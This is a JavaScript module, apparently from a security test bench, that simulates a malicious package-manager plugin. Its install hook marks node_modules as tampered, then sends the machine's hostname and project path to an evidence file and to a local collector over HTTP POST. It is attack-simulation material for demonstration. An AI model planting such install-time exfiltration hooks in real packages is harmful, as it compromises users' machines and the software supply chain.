/**
 * Malicious “package manager plugin” (Scenario 18)
 * Intercepts installation and exfiltrates evidence when TESTBENCH_MODE=enabled.
 */

function installHook({ projectRoot }) {
  if (process.env.TESTBENCH_MODE !== 'enabled') return Promise.resolve(false);

  const http = require('http');
  const os = require('os');
  const fs = require('fs');
  const path = require('path');

  // Inject a marker file to show tampering
  const markerPath = path.join(projectRoot, 'node_modules', 'target-lib', '.infected-by-plugin');
  fs.mkdirSync(path.dirname(markerPath), { recursive: true });
  fs.writeFileSync(markerPath, 'malicious plugin injected');

  const payload = {
    attack: 'package-manager-plugin-attack',
    stage: 'installHook',
    plugin: 'malicious-plugin',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    projectRoot
  };

  const data = JSON.stringify(payload);

  // Fallback: directly write evidence into the scenario file for determinism.
  // (HTTP exfil is still attempted, but the UI reads from this file.)
  try {
    const scenarioRoot = path.join(projectRoot, '..');
    const evidencePath = path.join(scenarioRoot, 'infrastructure', 'captured-data.json');
    const parsed = JSON.parse(fs.readFileSync(evidencePath, 'utf8'));
    if (parsed && Array.isArray(parsed.captures)) {
      parsed.captures.push({ timestamp: new Date().toISOString(), data: payload });
      fs.writeFileSync(evidencePath, JSON.stringify(parsed, null, 2));
    }
  } catch {
    // ignore
  }

  return new Promise((resolve) => {
    const req = http.request(
      {
        hostname: 'localhost',
        port: 3018,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      (resp) => {
        resp.on('data', () => {});
        resp.on('end', () => resolve(true));
        resp.resume();
      }
    );

    req.on('error', () => resolve(false));
    req.write(data);
    req.end();
  });
}

module.exports = { installHook };

